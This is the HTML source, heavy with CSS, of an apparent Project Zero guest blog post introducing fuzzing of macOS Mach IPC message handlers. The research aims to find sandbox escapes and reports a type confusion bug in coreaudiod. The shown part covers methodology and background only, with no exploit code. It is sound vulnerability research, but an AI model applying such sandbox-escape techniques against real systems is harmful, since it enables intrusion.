&quot;}.lst-kix_isqxjnyw1znn-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-5,lower-roman) &quot;. &quot;}ol.lst-kix_ohg79bwzg1vr-3.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-3 0}.lst-kix_isqxjnyw1znn-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-3,decimal) &quot;. &quot;}.lst-kix_isqxjnyw1znn-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-7,lower-latin) &quot;. &quot;}ol.lst-kix_csck9rydgkh1-3.start{counter-reset:lst-ctn-kix_csck9rydgkh1-3 0}.lst-kix_isqxjnyw1znn-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-2,lower-roman) &quot;. &quot;}.lst-kix_isqxjnyw1znn-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-6,decimal) &quot;. &quot;}.lst-kix_isqxjnyw1znn-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-1,lower-latin) &quot;. &quot;}.lst-kix_q9a0bbs1jjeb-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_b44qe3f46l3s-8.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-8 0}.lst-kix_q9a0bbs1jjeb-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q9a0bbs1jjeb-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_jlc16l67nmi-7.start{counter-reset:lst-ctn-kix_jlc16l67nmi-7 0}.lst-kix_isqxjnyw1znn-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-0,decimal) &quot;. &quot;}.lst-kix_isqxjnyw1znn-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-8,lower-roman) &quot;. &quot;}.lst-kix_q9a0bbs1jjeb-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_cmt5lo7st1fx-8{list-style-type:none}.lst-kix_ohg79bwzg1vr-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ohg79bwzg1vr-8,lower-roman) &quot;. &quot;}.lst-kix_q9a0bbs1jjeb-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_q9a0bbs1jjeb-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_csck9rydgkh1-8&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-8}.lst-kix_q9a0bbs1jjeb-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q9a0bbs1jjeb-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_66v3bj6n178-2{list-style-type:none}ul.lst-kix_66v3bj6n178-3{list-style-type:none}.lst-kix_isqxjnyw1znn-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_isqxjnyw1znn-4,lower-latin) &quot;. &quot;}.lst-kix_b44qe3f46l3s-2&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-2}ul.lst-kix_66v3bj6n178-0{list-style-type:none}ol.lst-kix_jlc16l67nmi-1.start{counter-reset:lst-ctn-kix_jlc16l67nmi-1 0}ul.lst-kix_66v3bj6n178-1{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-2{list-style-type:none}ul.lst-kix_4biuj26gsfpv-4{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-1{list-style-type:none}ul.lst-kix_4biuj26gsfpv-3{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-0{list-style-type:none}ul.lst-kix_4biuj26gsfpv-2{list-style-type:none}ul.lst-kix_4biuj26gsfpv-1{list-style-type:none}.lst-kix_csck9rydgkh1-4&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-4}ul.lst-kix_q9a0bbs1jjeb-6{list-style-type:none}ul.lst-kix_4biuj26gsfpv-0{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-5{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-4{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-3{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-0{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-1{list-style-type:none}.lst-kix_q9a0bbs1jjeb-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_q9a0bbs1jjeb-8{list-style-type:none}ul.lst-kix_q9a0bbs1jjeb-7{list-style-type:none}ol.lst-kix_b44qe3f46l3s-7.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-7 0}ol.lst-kix_csck9rydgkh1-2.start{counter-reset:lst-ctn-kix_csck9rydgkh1-2 0}ol.lst-kix_ohg79bwzg1vr-2.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-2 0}.lst-kix_jlc16l67nmi-1&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-1}ol.lst-kix_isqxjnyw1znn-8.start{counter-reset:lst-ctn-kix_isqxjnyw1znn-8 0}ul.lst-kix_4biuj26gsfpv-8{list-style-type:none}ul.lst-kix_4biuj26gsfpv-7{list-style-type:none}ul.lst-kix_4biuj26gsfpv-6{list-style-type:none}.lst-kix_jlc16l67nmi-7&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-7}ul.lst-kix_4biuj26gsfpv-5{list-style-type:none}ol.lst-kix_jlc16l67nmi-2.start{counter-reset:lst-ctn-kix_jlc16l67nmi-2 0}ol.lst-kix_csck9rydgkh1-8.start{counter-reset:lst-ctn-kix_csck9rydgkh1-8 0}.lst-kix_b44qe3f46l3s-4&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-4}ul.lst-kix_9qoa5amsz4qz-8{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-6{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-7{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-4{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-5{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-2{list-style-type:none}ul.lst-kix_9qoa5amsz4qz-3{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-8.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-8 0}.lst-kix_ohg79bwzg1vr-5&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-5}ol.lst-kix_csck9rydgkh1-7.start{counter-reset:lst-ctn-kix_csck9rydgkh1-7 0}.lst-kix_cmt5lo7st1fx-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_jlc16l67nmi-8.start{counter-reset:lst-ctn-kix_jlc16l67nmi-8 0}.lst-kix_cmt5lo7st1fx-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4biuj26gsfpv-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4biuj26gsfpv-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_ohg79bwzg1vr-1.start{counter-reset:lst-ctn-kix_ohg79bwzg1vr-1 0}.lst-kix_cmt5lo7st1fx-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_jlc16l67nmi-5.start{counter-reset:lst-ctn-kix_jlc16l67nmi-5 0}.lst-kix_isqxjnyw1znn-8&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-8}.lst-kix_eo6kkvwc0cs-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_eo6kkvwc0cs-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_csck9rydgkh1-2&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-2}.lst-kix_eo6kkvwc0cs-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_b44qe3f46l3s-8&gt;li{counter-increment:lst-ctn-kix_b44qe3f46l3s-8}ol.lst-kix_b44qe3f46l3s-4.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-4 0}.lst-kix_4biuj26gsfpv-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_b44qe3f46l3s-1.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-1 0}.lst-kix_eo6kkvwc0cs-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4biuj26gsfpv-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ohg79bwzg1vr-3&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-3}ol.lst-kix_ohg79bwzg1vr-8{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-5{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-4{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-7{list-style-type:none}.lst-kix_qtp122dx6iyw-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_ohg79bwzg1vr-6{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-1{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-0{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-3{list-style-type:none}ol.lst-kix_ohg79bwzg1vr-2{list-style-type:none}ol.lst-kix_csck9rydgkh1-5.start{counter-reset:lst-ctn-kix_csck9rydgkh1-5 0}.lst-kix_ohg79bwzg1vr-4&gt;li{counter-increment:lst-ctn-kix_ohg79bwzg1vr-4}.lst-kix_jlc16l67nmi-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-8,lower-roman) &quot;. &quot;}.lst-kix_csck9rydgkh1-3&gt;li{counter-increment:lst-ctn-kix_csck9rydgkh1-3}.lst-kix_66v3bj6n178-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_jlc16l67nmi-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-0,decimal) &quot;. &quot;}.lst-kix_jlc16l67nmi-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-4,lower-latin) &quot;. &quot;}.lst-kix_9qoa5amsz4qz-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_qtp122dx6iyw-1{list-style-type:none}.lst-kix_66v3bj6n178-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_qtp122dx6iyw-0{list-style-type:none}ul.lst-kix_qtp122dx6iyw-3{list-style-type:none}ul.lst-kix_qtp122dx6iyw-2{list-style-type:none}ul.lst-kix_qtp122dx6iyw-5{list-style-type:none}ul.lst-kix_qtp122dx6iyw-4{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_b44qe3f46l3s-3.start{counter-reset:lst-ctn-kix_b44qe3f46l3s-3 0}ul.lst-kix_qtp122dx6iyw-7{list-style-type:none}.lst-kix_jlc16l67nmi-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-6,decimal) &quot;. &quot;}ul.lst-kix_qtp122dx6iyw-6{list-style-type:none}.lst-kix_66v3bj6n178-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_jlc16l67nmi-6.start{counter-reset:lst-ctn-kix_jlc16l67nmi-6 0}ul.lst-kix_qtp122dx6iyw-8{list-style-type:none}.lst-kix_isqxjnyw1znn-3&gt;li{counter-increment:lst-ctn-kix_isqxjnyw1znn-3}.lst-kix_66v3bj6n178-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jlc16l67nmi-8&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-8}.lst-kix_coh4nx83hsps-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_9qoa5amsz4qz-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_csck9rydgkh1-4.start{counter-reset:lst-ctn-kix_csck9rydgkh1-4 0}.lst-kix_jlc16l67nmi-2&gt;li{counter-increment:lst-ctn-kix_jlc16l67nmi-2}.lst-kix_coh4nx83hsps-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jlc16l67nmi-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jlc16l67nmi-2,lower-roman) &quot;. &quot;}.lst-kix_9qoa5amsz4qz-5&gt;li:before{content:&quot;\0025a0   &quot;}ol{margin:0;padding:0}table td,table th{padding:0}.VEfNEQsFFH-c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:243.8pt;border-top-color:#000000;border-bottom-style:solid}.VEfNEQsFFH-c22{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:244.5pt;border-top-color:#000000;border-bottom-style:solid}.VEfNEQsFFH-c4{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Google Sans&quot;;font-style:normal}.VEfNEQsFFH-c23{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.VEfNEQsFFH-c11{color:#999999;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:13pt;font-family:&quot;Google Sans&quot;;font-style:normal}.VEfNEQsFFH-c8{padding-top:2pt;padding-bottom:2pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.VEfNEQsFFH-c39{padding-top:0pt;padding-bottom:10pt;line-height:1.5;orphans:2;widows:2;text-align:center}.VEfNEQsFFH-c13{padding-top:0pt;padding-bottom:10pt;line-height:1.5;orphans:2;widows:2;text-align:left}.VEfNEQsFFH-c37{padding-top:0pt;padding-bottom:10pt;line-height:1.5;orphans:2;widows:2;text-align:right}.VEfNEQsFFH-c10{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.VEfNEQsFFH-c25{border-spacing:0;border-collapse:collapse;margin-right:auto}.VEfNEQsFFH-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.VEfNEQsFFH-c0{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.VEfNEQsFFH-c21{color:#999999;font-weight:400;font-size:20pt;font-family:&quot;Google Sans&quot;}.VEfNEQsFFH-c12{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.VEfNEQsFFH-c16{color:#999999;font-weight:400;font-size:16pt;font-family:&quot;Google Sans&quot;}.VEfNEQsFFH-c38{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.VEfNEQsFFH-c7{font-size:9pt;font-family:&quot;Roboto Mono&quot;;font-weight:700}.VEfNEQsFFH-c28{font-weight:400;font-size:13pt;font-family:&quot;Google Sans&quot;}.VEfNEQsFFH-c2{font-size:9pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.VEfNEQsFFH-c1{color:#188038;font-weight:400;font-family:&quot;Roboto Mono&quot;}.VEfNEQsFFH-c19{font-weight:700;font-size:11pt;font-family:&quot;Google Sans&quot;}.VEfNEQsFFH-c15{text-decoration:none;vertical-align:baseline;font-style:normal}.VEfNEQsFFH-c35{font-weight:400;font-family:&quot;Arial&quot;}.VEfNEQsFFH-c14{margin-left:36pt;padding-left:0pt}.VEfNEQsFFH-c34{color:#999999}.VEfNEQsFFH-c18{height:11pt}.VEfNEQsFFH-c27{background-color:#000000}.VEfNEQsFFH-c31{font-size:11pt}.VEfNEQsFFH-c26{font-weight:700}.VEfNEQsFFH-c17{height:0pt}.VEfNEQsFFH-c6{color:#1967d2}.VEfNEQsFFH-c9{color:#37474f}.VEfNEQsFFH-c32{color:#ffffff}.VEfNEQsFFH-c36{font-size:9pt}.VEfNEQsFFH-c33{height:61.2pt}.VEfNEQsFFH-c3{color:#188038}.VEfNEQsFFH-c29{color:#9334e6}.VEfNEQsFFH-c5{color:#c5221f}.VEfNEQsFFH-c20{color:#b80672}.title{padding-top:20pt;color:#999999;font-size:20pt;padding-bottom:6pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Google Sans&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Google Sans&quot;}h1{padding-top:20pt;color:#999999;font-size:20pt;padding-bottom:6pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#999999;font-size:16pt;padding-bottom:6pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:18pt;color:#999999;font-size:13pt;padding-bottom:6pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Google Sans&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c38 doc-content&quot;&gt;&lt;div&gt;
 &lt;p class=&quot;VEfNEQsFFH-c18 VEfNEQsFFH-c37&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c19&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c26 VEfNEQsFFH-c34&quot;&gt;Guest post by Dillon Franke, Senior Security Engineer&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c34 VEfNEQsFFH-c26&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c34 VEfNEQsFFH-c26&quot;&gt;&amp;nbsp;20% time on Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Every second, highly-privileged MacOS system daemons accept and process hundreds of IPC messages. In some cases, these message handlers accept data from sandboxed or unprivileged processes.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In this blog post, I&amp;rsquo;ll explore using Mach IPC messages as an attack vector to find and exploit sandbox escapes. I&amp;rsquo;ll detail how I used a custom fuzzing harness, dynamic instrumentation, and plenty of debugging/static analysis to identify a high-risk type confusion vulnerability in the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;system daemon. Along the way, I&amp;rsquo;ll discuss some of the difficulties and tradeoffs I &lt;/span&gt;&lt;span&gt;encountered&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Transparently,&lt;/span&gt;&lt;span&gt;&amp;nbsp;this was my first venture into the world of MacOS security research and &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;building a custom fuzzing harness. I hope this post serves as a guide to those who wish to embark on similar research endeavors.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I am open-sourcing the fuzzing harness I built, as well as several tools I wrote that were useful to me throughout this project. All of this can be found here: &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz&quot;&gt;https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.uj8ypinvpyns&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;The Approach: Knowledge-Driven Fuzzing&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;For this research project, I adopted a hybrid approach that combined fuzzing and manual reverse engineering, which I refer to as &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c26&quot;&gt;knowledge-driven fuzzing&lt;/span&gt;&lt;span&gt;. This method, learned from my friend &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://x.com/NedWilliamson&quot;&gt;Ned Williamson&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;, balances automation with targeted investigation. Fuzzing provided the means to quickly test a wide range of inputs and identify areas where the system&amp;rsquo;s behavior deviated from expectations. However, when the fuzzer&amp;rsquo;s code coverage plateaued or specific hurdles arose, manual analysis came into play, forcing me to dive deeper into the target&amp;rsquo;s inner workings.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Knowledge-driven fuzzing offers two key advantages. First, the research process never stagnates, as the goal of improving the code coverage of the fuzzer is always present. Second, achieving this goal requires a deep understanding of the code you are fuzzing. By the time you begin triaging legitimate, security-relevant crashes, the reverse engineering process will have given you extensive knowledge of the codebase, enabling analysis of crashes from an informed perspective.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;The cycle I followed during this research is as follows:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_jlc16l67nmi-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Identify an att&lt;/span&gt;&lt;span&gt;ack vector&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Choose a target&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Create a fuzzing harness&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Fuzz and produce crashes &lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Analyze crashes and code coverage &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Iterate on the fuzzing harness&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Repeat steps 4-6 &amp;nbsp;&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h1 class=&quot;VEfNEQsFFH-c23&quot; id=&quot;h.s2auq26juqw&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c21 VEfNEQsFFH-c15&quot;&gt;Identify an Attack Vector&lt;/span&gt;&lt;/h1&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Standard browser sandboxing limits code execution by restricting direct operating system access. Consequently, exploiting a browser vulnerability typically requires the use of a separate &amp;ldquo;sandbox escape&amp;rdquo; vulnerability.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Since interprocess communication (IPC) mechanisms allow two processes to communicate with each other, they can naturally serve as a bridge from a sandboxed process to an unrestricted one. This makes them a prime attack vector for sandbox escapes, as shown below.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;center&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_h5AXJEFTBHQa0PFGnpwzqggpFbxNHIXMlCga7afZdi-qtzdBRGEy1v5c7a_b48JI3mY7LNicZihUBDB6cUHPnLhnLW1ReCSJVQq9sksmL1Y3CSHEGwTT28i8vgwgrvJPeLo2bf0RxEpLx4uO3OjMDVuqlIbvIO-GORZ5KsVC8MBF-94lUSThyphenhyphen_euKIo/s647/unnamed.png&quot; style=&quot;max-height: 375px; max-width: 300px; display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_h5AXJEFTBHQa0PFGnpwzqggpFbxNHIXMlCga7afZdi-qtzdBRGEy1v5c7a_b48JI3mY7LNicZihUBDB6cUHPnLhnLW1ReCSJVQq9sksmL1Y3CSHEGwTT28i8vgwgrvJPeLo2bf0RxEpLx4uO3OjMDVuqlIbvIO-GORZ5KsVC8MBF-94lUSThyphenhyphen_euKIo/s600/unnamed.png&quot; border=&quot;0&quot; alt=&quot;A diagram illustrating SANDBOX ESCAPE and PRIVILEGE ESCALATION. The sandbox escape shows a Web Browser Process within a SANDBOX RESTRICTED communicating with a Message Handler via MACH IPC. The privilege escalation shows an Unprivileged Process communicating with a Message Handler Highly Privileged Process via MACH IPC.&quot; style=&quot;max-height: 375px; max-width: 300px; &quot; title=&quot;A diagram illustrating SANDBOX ESCAPE and PRIVILEGE ESCALATION. The sandbox escape shows a Web Browser Process within a SANDBOX RESTRICTED communicating with a Message Handler via MACH IPC. The privilege escalation shows an Unprivileged Process communicating with a Message Handler Highly Privileged Process via MACH IPC.&quot; /&gt;&lt;/a&gt;&lt;/center&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;I chose Mach messages, the lowest level IPC component in the MacOS operating system, as the attack vector of focus for this research. I chose them mostly due to my desire to understand MacOS IPC mechanisms at their most core level, as well as the track record of historical security issues with Mach messages.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.nh8rq0s8hxr1&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Previous Work and Background&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Leveraging Mach messages in exploit chains is far from a novel idea. For example, Ian Beer &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html&quot;&gt;identified a core design issue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in 2016 with the XNU kernel related to the handling of &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;task_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;Mach ports, which allowed for exploitation via Mach messages. &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html&quot;&gt;Another post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;showed how an in-the-wild exploit chain &lt;/span&gt;&lt;span&gt;utilized Mach messages in 2019 for heap grooming techniques.&lt;/span&gt;&lt;span&gt;&amp;nbsp;I also drew much inspiration from Ret2 Systems&amp;rsquo; &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://blog.ret2.io/2018/06/05/pwn2own-2018-exploit-development/&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;about leveraging Mach message handlers to find and weaponize a Safari sandbox escape.&lt;/span&gt;&lt;/p&gt;
